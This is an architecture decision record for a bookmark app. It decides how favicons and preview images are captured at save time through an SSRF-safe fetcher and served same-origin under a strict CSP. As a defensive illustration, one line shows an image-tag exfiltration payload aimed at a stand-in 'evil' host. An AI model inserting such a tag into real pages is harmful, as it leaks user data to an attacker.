# 0027. Link preview images and favicons under the CSP

- Status: Accepted
- Date: 2026-11-07
- Source: issue #57 (raised in the #35 review); issues #70–#74; `docs/PROJECT.md` 3, 4 (story 4), 5.7, 5.8, 6.1, 7; `docs/SETUP.md` 5.6; [0013](0013-vercel-hobby-hosting.md), [0019](0019-vercel-deployment-architecture.md), [0020](0020-npm-install-scripts-policy.md), [0022](0022-csp-nonce-routing-middleware.md)

## Context

- Story 4 and the LinkCard spec need a site icon and a preview image (16:9 `sm-card__media`, falls back to the site letter on `accent-bg`). `Link.faviconUrl` and `Link.imageUrl` (6.1) hold them; #70 extracts both as absolute third-party `http(s)` URLs (`LinkPreview` contract on `feat/70-safe-fetcher`).
- The app CSP (`buildCsp()` in `libs/web/csp`, the copy in `vercel.json`, SETUP 5.6) has `img-src 'self' data:`. Every third-party image is blocked, so `ui-favicon`, `ui-card` and `ui-list-item` always show their fallbacks. Their docs say "until stage 3 decides" (#57).
- The add-link screens (`AddLink.dc.html`, `MobileAddLink.dc.html`) show only the favicon letter and the domain, no preview image. Images matter in the feed (cards, optional list thumbnail).
- Constraints: free tier only (Vercel Hobby, Neon Free 0.5 GB storage, 100 CU-hours). One function with `maxDuration` 10 s. The fetcher limits from #70 are 5 redirects, 3 s connect, 8 s total, 2 MB body. 5.8 requires the SSRF guard on every outbound fetch. Shelfmark is a private bookmark manager, so the set of domains a user saved is personal data.

Free-tier figures below were published by Vercel and Neon when this ADR was written (vercel.com/docs/limits, vercel.com/docs/image-optimization/limits-and-pricing, vercel.com/docs/vercel-blob/usage-and-pricing, neon.com/pricing). They must be re-checked before implementation.

## Options

**1. Allow third-party images directly (`img-src 'self' data: https:`).**
- Privacy: every feed view makes the user's browser request every saved site, which leaks the user's IP, user agent and viewing times to each host. A host can use this as a tracking pixel. `referrerpolicy="no-referrer"` hides only the referrer. Browsers that still allow third-party cookies may send them.
- Security: the CSP no longer blocks image-based exfiltration (`<img src="https://evil/?d=…">` after any HTML injection), which weakens defence in depth. Images can change after save (bait-and-switch content). `http:` images are blocked or upgraded as mixed content.
- Cost and performance: zero hosting cost. But full-size `og:image` files (often 0.2–2 MB) load on phones, there is no control over caching, and hotlink protection or dead hosts break cards.
- Size: about one line in `CSP_DIRECTIVES` plus the `vercel.json` copy and tests.

**2. Re-host through our own origin with the SSRF-safe fetcher.** The CSP stays `img-src 'self' data:`. Third parties see only our server's IP, not the user.
- **2a. On demand proxy** (`/api/img?u=…`). This is an open proxy unless URLs are HMAC-signed. Each uncached view does a remote fetch of up to 8 s inside a function. Images rot when the source disappears. Responses can be CDN-cached when they are public and signed, but then a cached URL reveals which image a user saved.
- **2b. Capture at save time, stored in Postgres.** Save already runs server-side. The API fetches the favicon and the preview image, checks and re-encodes them small, and stores the bytes in a user-owned row. It serves them from `/api/links/:id/favicon|image` with the session `userId` filter. Account deletion and demo cleanup remove the images through the FK cascade. Cost: function invocations on cold browser caches (Hobby includes 1M per month) and DB storage. At about 45 KB per link worst case, 0.5 GB holds about 10k links.
- **2c. Capture at save time, stored in Vercel Blob.** Hobby includes 1 GB storage, 10 GB transfer, 10k simple / 2k advanced operations per month. Images are served from the CDN on `<store>.public.blob.vercel-storage.com`, so the CSP gains that origin. Public blobs can be read by anyone who has the URL. Private blobs need a function in front anyway. Deletion is not transactional with Postgres: account deletion, demo cleanup and link deletion must also delete blobs, or orphans pile up. It needs one more secret (`BLOB_READ_WRITE_TOKEN`).
- **2d. Vercel Image Optimization (`/_vercel/image`).** The URL is same-origin, but any-host `remotePatterns` turns it into an unauthenticated open proxy. Vercel fetches the images outside our SSRF policy and rate limits. Hobby includes 5k transformations per month, and after that optimisation stops until the next cycle, so anyone can exhaust the quota. Using our own `/api/links/:id/image` as the source does not work, because the optimiser does not forward the session cookie.
- Security for all 2x variants: the image URLs come from untrusted HTML. They must go through the fetcher (DNS pinning, private ranges blocked on every redirect hop). We decide the image type from magic bytes, never from the remote `Content-Type`. SVG is rejected, because an SVG served from our origin and opened directly runs script in our origin. Decompression bombs are capped by a pixel limit.

**3. Third-party favicon service** (Google `s2/favicons` / `gstatic`, DuckDuckGo `icons.duckduckgo.com`, icon.horse). The CSP gains one or two hosts. Every feed view sends the domain of every saved link, plus the user's IP, to that company. That is the user's bookmark list. The services are unofficial or have no SLA. They do not solve preview images. Implementation is small.

**4. No remote images.** We keep the letter favicon and drop the preview image. Zero cost and zero risk, and the CSP stays strict. It does not meet story 4 or the LinkCard design, so it is the fallback state, not a target.

## Decision

**Option 2b: capture at save time through the SSRF-safe fetcher, re-encode, store in Postgres, serve same-origin. The CSP stays `img-src 'self' data:`.** Option 4 stays the fallback whenever capture fails. No browser ever requests a third-party image.

- **Fetch:** the fetcher (#70) gets an image mode. It uses the same URL and IP policy and redirect re-validation. The allowlist is PNG, JPEG, GIF, WebP, ICO and AVIF, detected by magic bytes, with SVG rejected. Limits: 3 MB body, 5 s total per image, 16 MP decoded pixels. The extractor returns ordered favicon candidates: `icon`/`apple-touch-icon` with `sizes`, raster preferred, then `/favicon.ico`. Capture tries them until one passes.
- **Normalise:** `sharp` decodes the first frame, strips metadata and re-encodes to WebP. The preview is 640×360 cover (16:9, the card ratio) and is dropped above 64 KB. The favicon is 32×32 (16 px at 2×) and is dropped above 8 KB. Re-encoding means we never serve the original remote bytes. `sharp` ships prebuilt binaries through optional `@img/*` packages, which needs review under [0020](0020-npm-install-scripts-policy.md) and a static import in `api/index.mjs` ([0019](0019-vercel-deployment-architecture.md)). If review rejects it, the fallback is pure-JS dimension checks (`image-size`) with the original bytes stored under the same caps.
- **Store:** a `LinkImage` table with `id`, `userId`, `linkId` (FK, cascade), `kind` (`LINK_IMAGE_KIND.Favicon | Preview`), `contentType`, `bytes` (bytea), `width`, `height`, `sha256`, timestamps. It is unique on `(linkId, kind)`. `Link` keeps the source URLs (`faviconSourceUrl`, `imageSourceUrl`) for re-capture.
- **When:** capture runs on `POST /api/links`. A `PATCH` that really changes the URL drops the images and marks the link for a lazy re-capture (see the #189 note at the end). It is best-effort, fetches both images in parallel and must finish in 5 s, so the save always fits `maxDuration` 10 s. A failed capture never fails the save. The create DTO may carry the `imageUrl` / `faviconUrl` hints from the preview, so the page is not fetched twice. The fetcher treats these hints as untrusted like any URL. Without hints, the server extracts them itself. There is no periodic refresh in stage 1. The demo seed ships bundled images and makes no outbound fetches.
- **Serve:** `GET /api/links/:id/favicon` and `GET /api/links/:id/image`. They need a session, filter by `userId` and return 404 for foreign or missing links. Headers: `Content-Type` from the stored format, `X-Content-Type-Options: nosniff`, `Cross-Origin-Resource-Policy: same-origin`, `Content-Disposition: inline`, helmet's CSP, and `Cache-Control: private, max-age=31536000, immutable` (the URL carries `?v=<sha256 prefix>`). Every response is cached only in the browser and never in a shared cache.
- **Contract:** in the `Link` DTO, `faviconUrl` and `imageUrl` become same-origin paths (`/api/links/{id}/favicon?v=…`) or `null`. The web app binds them as they are. `LinkPreview` keeps the remote URLs for the server, and the dialog never renders them (it shows the letter, per the design).

## Consequences

- The CSP and its tests do not change. Privacy improves: third parties see only our server's IP, and only once per save. Cards keep working when the source site changes or goes offline.
- New work: the image mode of the fetcher, `sharp` (dependency review, about 30 MB in the function, far below 250 MB), a migration, two endpoints, data-isolation tests for them, and an update to PROJECT.md 6.1 (new table, changed meaning of `faviconUrl` / `imageUrl`).
- Each first view of a card is one function invocation plus one DB read. Browser caching makes repeat views free. Neon compute stays awake while the feed loads images.
- Saving takes up to 5 s longer when image hosts are slow. `waitUntil` (`@vercel/functions`) could move capture after the response later, but the card would then need a refresh.
- Revisit when DB storage passes about 60% of the free tier, or when invocations or CU-hours become the bottleneck. Then the bytes move to Blob (2c) behind the same endpoints, and only the storage layer changes.

## Alternatives considered

- **1. `img-src https:`**: rejected because it leaks the IP to every saved site on every view, weakens the CSP and serves unbounded image sizes.
- **2a. On-demand proxy**: rejected because it is slow on every cold view, rots with the source, and needs signed URLs to avoid being an open proxy.
- **2c. Vercel Blob**: kept as the scale-out path. Not chosen now because public URLs, a CSP origin, a new secret and non-transactional deletion cost more than the DB at stage-1 volume.
- **2d. Vercel Image Optimization**: rejected because it is an open proxy outside our SSRF policy and a Hobby quota that anyone can exhaust.
- **3. Favicon service**: rejected because it sends the user's bookmark domains and IP to a third party, has no SLA, and has no preview images.
- **4. Letter only**: rejected as the target because it fails story 4. Kept as the fallback.

## Implementation outline

- **#70** (fetcher): image mode with type sniffing and limits, ordered favicon candidates in the extractor, tests for SVG / oversize / wrong-type / private-redirect images.
- **#71** (models): `LinkImage` + `Link.faviconSourceUrl` / `imageSourceUrl`, cascade tests. Needs the PROJECT.md 6.1 update first.
- **#72** (links API): `sharp` review per 0020, capture on create / URL change, the two image endpoints, `Link` contract paths, data-isolation and header tests, throttling shared with link creation.
- **#73** (add-link dialog): favicon letter only, never binds remote preview URLs.
- **#74** (feed): binds the same-origin `faviconUrl` / `imageUrl`. The `libs/ui` docs of `ui-favicon`, `ui-card` and `ui-list-item` drop the "until stage 3" note. An e2e test asserts no CSP violations and no third-party image requests.

## Implementation notes (#149, links API)

- `sharp` 0.35.5 was reviewed under [0020](0020-npm-install-scripts-policy.md): no install script, so the `image-size` fallback was not needed.
- The fetcher got `fetchImage(url, overrides?)` next to `fetch`: same URL, address and redirect policy, raw bytes, response types `image/*` (not `image/svg+xml`) and `application/octet-stream`; 3 MB, 5 s, 3 redirects by default, per-call overrides only tighten. The real format comes from the magic bytes (`sniffImageFormat`), which allow PNG, JPEG, GIF, WebP, AVIF and ICO. libvips cannot read ICO, so `decodeIco` takes the biggest entry (embedded PNG, or a 1/4/8/24/32-bit BMP converted to RGBA).
- Capture runs after the create transaction commits, only for the created link (never on an idempotent replay), with what is left of `REQUEST_TIMEOUT_MS` (minus 1 s), at most 5 s, skipped below 1 s. `PATCH` with a new URL deletes the old images and does **not** capture again (the page fetch plus the capture would not fit the 8 s request timeout); the card shows the letter until a later re-capture feature exists.
- The whole capture races one deadline (at most 5 s, 4 s of it for the downloads, 1 s reserved for decoding and writing). Downloads run in parallel, decoding runs one image at a time, and the pixel limit is 16 MP, to bound memory on Vercel. If the request still ends in a 504 after the commit, the link exists without images, and a retry with the same `idempotencyKey` replays the first link without capturing again. The outbound image fetches are bounded by the AddLink rate limit of `POST /links`.
- A `PATCH` with a URL that normalizes to the same value keeps the images and source hints. Lazy or background re-capture is a follow-up.
- Stored under `CHECK`s for the kind, the content type (`image/webp`), the hash format and 64 KB. The dead `faviconUrl` / `imageUrl` columns of `Link` were dropped in #189 (see the note below).

## Note (#189): dropped columns and lazy re-capture after a URL change

- **Columns dropped.** `links.favicon_url` / `links.image_url` and their `*_scheme_check` constraints are gone (migration `drop_dead_link_image_columns`). Nothing read or wrote them (checked across `apps/`, `libs/`, `scripts/`, the demo seed); the remote hints live in `favicon_source_url` / `image_source_url`. A single contract step was enough, no expand-then-contract.
- **Choice: lazy capture on an image-route miss**, not a queue or cron. A cron or queue is a new moving part and a new deploy surface for a rare event; the lazy path reuses the capture service and the same SSRF-safe fetcher.
- **State.** `links.capture_attempted_at` (nullable, defaults to the insert time, so create and the seed are "attempted" and existing rows are backfilled by the migration default). A `PATCH` that really changes the normalized URL sets it to `NULL` = pending, next to deleting the images and hints. Refreshing the hints inside `PATCH` was not done: it needs a page fetch the request has no budget for.
- **Trigger: a POST, not a GET.** While pending, `LinkResponse.faviconUrl` / `imageUrl` carry `/api/links/:id/favicon|image?v=pending` (`LINK_IMAGE_PENDING_VERSION`). The web never binds that path (its own-path check wants a 16-hex hash); when a loaded link carries the marker, the links store calls `POST /api/links/:id/images/capture` once per link and session, without an error toast, and on success puts the returned paths into the feed and the recent list. An earlier draft triggered the capture from a `GET .../image` miss; it was dropped because `apps/api/CLAUDE.md` forbids state-changing `GET` (SameSite=Lax cookies ride along on cross-site top-level GETs), with no exception. `GET /api/links/:id/favicon|image` are pure reads.
- **The endpoint.** `POST /api/links/:id/images/capture`, session user only, covered by the global `CsrfGuard` (foreign `Origin` is 403) and `@RateLimit(RATE_LIMIT.AddLink)` (30 a minute: the same cost as create, one page and up to two images from a third party; `Preview` is smaller than that). One atomic `UPDATE ... WHERE id AND user_id AND (capture_attempted_at IS NULL OR < now() - RECAPTURE_COOLDOWN_MS)` (1 h) claims the link. Only the winner fetches. Concurrent calls and calls during the cooldown skip the capture. The claim is persisted, so it holds across serverless instances (no in-process lock). It is plain SQL on purpose: a capture must not bump `updated_at`. A foreign link claims nothing and fetches nothing (404, the same as a missing one).
- **Response.** Always 200 with the `LinkResponse` as it is afterwards (`CaptureLinkImagesResponse`): `?v=<hash>` paths when images were stored, the link unchanged when the call lost the claim or the page had nothing. A 204 or 409 for "not claimed" was rejected: the client would have to refetch the link or handle two success shapes, and a status that differs between winner and loser tells a caller nothing it may act on.
- **Inside the request.** The Vercel handler returns when the response ends and the repo has no `waitUntil`, so work after the response may be frozen. The winner finishes within the request budget: page load 3 s when no hints are stored, then the existing capture with the rest of the 8 s `REQUEST_TIMEOUT_MS` minus a 1.5 s margin (for the link read and the response). Never in a database transaction, no advisory lock (the lock order of `apps/api/CLAUDE.md` is untouched), only `SafeFetcherService`.
- **Race with a second PATCH.** After the capture the service re-reads the normalized URL; if it changed meanwhile it deletes the images it wrote (the PATCH already marked the link pending again).
- **Claim loser.** A call that loses the claim answers with the link as it is, which still carries `?v=pending` while the winner runs; the web asked once and does not ask again until the next page load (a reload then shows the stored images).
- **Failure.** A failed attempt keeps its claim: the link response stops showing `v=pending`, so the web does not ask again; a direct call can retry after the cooldown. There is no periodic refresh.
- **Cost bound.** One outbound page fetch plus two image fetches per URL change and cooldown window, per link, behind the AddLink rate limit.
